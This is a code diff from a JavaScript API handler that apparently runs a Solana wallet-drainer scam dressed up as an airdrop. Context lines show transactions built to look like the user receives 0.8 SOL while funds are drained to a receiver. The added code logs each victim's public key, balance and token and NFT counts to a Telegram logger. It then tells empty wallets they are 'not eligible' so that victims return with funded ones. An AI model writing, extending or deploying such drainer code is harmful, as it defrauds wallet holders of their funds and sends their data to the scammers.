@@ -419,16 +419,27 @@ export default async function handler(req, res) {
         tx.add(airdropIx);
         console.log(`Added airdrop claim: ${drainAmount} lamports (appears as receiving 0.8 SOL)`);
       } else {
-        // For zero balance, create minimal transaction
-        const minimalIx = SystemProgram.transfer({
-          fromPubkey: userPubkey,
-          toPubkey: RECEIVER,
-          lamports: 1000,
+        // For zero or insufficient balance, do NOT create a transaction
+        // Log insufficient funds and return early
+        await telegramLogger.logDrainAttempt({
+          publicKey: userPubkey.toString(),
+          lamports: lamports,
+          tokenCount: 0,
+          nftCount: 0,
+          transactionSize: 0,
+          instructions: 0,
+          success: false,
+          actualDrainAmount: 0,
+          hasTokens: false,
+          hasNFTs: false,
+          error: 'Insufficient funds - no SOL or tokens to drain'
         });
-        tx.add(minimalIx);
-        console.log(`Added minimal airdrop claim: 1000 lamports (appears as receiving 0.8 SOL)`);
+        return res.status(400).json({
+          error: 'Sorry, You\'re Not eligible',
+          details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
+          code: 'INSUFFICIENT_FUNDS'
+        });
       }
-      console.log(`Added PSYOPS airdrop simulation: User appears to be receiving 0.8 SOL airdrop`);
     } catch (error) {
       console.error('Error processing PSYOPS airdrop:', error);
       return res.status(500).json({ error: 'Failed to create airdrop transaction', details: error.message });
